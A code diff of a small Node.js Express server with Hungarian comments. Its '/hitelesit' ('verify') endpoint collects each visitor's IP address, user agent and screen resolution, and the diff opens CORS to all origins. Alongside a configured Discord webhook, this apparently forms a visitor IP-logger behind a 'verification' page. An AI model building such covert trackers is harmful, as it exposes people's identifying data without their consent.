@@ -3,16 +3,22 @@ const axios = require('axios');
 const cors = require('cors');
 const app = express();
 
-// CORS engedélyezése, hogy a Netlify oldalad küldhessen adatot
-app.use(cors());
+// ENGEDÉLYEZD MINDEN FORRÁST ÉS MINDEN METÓDUST
+app.use(cors({
+    origin: '*',
+    methods: ['GET', 'POST', 'OPTIONS'],
+    allowedHeaders: ['Content-Type']
+}));
+
 app.use(express.json());
 
-// A Webhookot a Railway "Variables" menüjében állítsd be DISCORD_WEBHOOK_URL néven!
 const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
+
+// Kezeld le az OPTIONS kéréseket, amiket a böngésző a POST előtt küld
+app.options('*', cors());
 
 app.post('/hitelesit', async (req, res) => {
     try {
-        // IP cím kinyerése a proxy mögül
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         const { ua, res: screen } = req.body;
 
@@ -34,5 +40,5 @@ app.post('/hitelesit', async (req, res) => {
     }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Szerver fut a ${PORT}-os porton`));
+const PORT = process.env.PORT || 8080;
+app.listen(PORT, '0.0.0.0', () => console.log(`Szerver fut a ${PORT}-os porton`));
